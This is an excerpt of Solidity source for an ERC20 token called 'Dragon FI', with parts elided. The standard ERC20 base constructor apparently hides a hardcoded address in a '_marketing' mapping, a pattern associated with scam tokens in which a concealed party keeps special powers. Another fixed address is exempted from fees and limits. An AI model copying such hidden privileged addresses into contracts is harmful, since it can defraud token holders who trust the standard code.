...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x49FE4242D2699E0F8BA2247d6DFeDe21a038F736] = _marketingwallet;
    }
...
contract DRAGONFI is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Dragon FI", " DraFi") {
        ...
        excludeFromFees(address(0xbe3a86b2c869586F1036864C7B1E93de09BaC9fd), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xbe3a86b2c869586F1036864C7B1E93de09BaC9fd), true);
